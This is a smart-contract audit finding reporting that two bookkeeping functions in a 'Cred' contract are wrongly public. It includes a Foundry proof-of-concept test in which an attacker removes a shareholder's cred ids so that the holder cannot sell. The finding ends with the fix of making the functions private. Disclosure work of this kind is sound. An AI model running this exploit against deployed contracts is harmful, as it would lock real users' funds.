# Vulnerability details

## Description
The `_addCredIdPerAddress` and `_removeCredIdPerAddress` are used to update `_credIdsPerAddress`. These functions are used internally by `_updateCuratorSignalBalance` to update the balance for a user.

However, these functions have their visibility set to public instead of being internal or private, allowing anyone to add or remove cred ids for any user.

A malicious actor could remove all cred ids from a share holder, preventing them from selling their shares.

## Impact
Malicious actor can manipulate user cred balances, preventing share holders from selling their shares and causing a DOS.

## POC
Paste the following code in `test/Cred.t.sol`

```solidity
    function testPreventShareHoldersFromSelling() public {
        _createCred("BASIC", "SIGNATURE", 0x0);
        uint256 credId = 1;

        address maliciousActor = makeAddr("maliciousActor");

        vm.startPrank(anyone);
        vm.deal(anyone, 1 ether);

        // First a user buys cred shares
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 1);
        cred.buyShareCred{ value: buyPrice }(1, 1, 0);
        vm.stopPrank();

        // After this a malicious actor removes cred ids for the share holder
        vm.startPrank(maliciousActor);
        cred._removeCredIdPerAddress(credId, anyone);

        // Here, we confirm the share holder no longer has any credIds where they have a position
        (uint256[] memory credIds,) = cred.getPositionsForCurator(anyone, 0, 0);
        assertEq(credIds.length, 0);
        vm.stopPrank();

        // Skip the share lock period
        skip(10 minutes + 1 seconds);

        // Lastly the share holder will try to sell their shares but the transaction will fail
        vm.startPrank(anyone);
        cred.sellShareCred(credId, 1, 0);
        vm.stopPrank();
    }
```

After running this POC test, you will see that the test reverts and the share holder cannot sell his shares. An attacker could potentially do this for every share holder, preventing anyone from selling.

## Tools Used
Manual Review, Foundry

## Recommended Mitigation
Both `_addCredIdPerAddress` and `_removeCredIdPerAddress` functions should be set to private, ensuring no outside actors can call it.
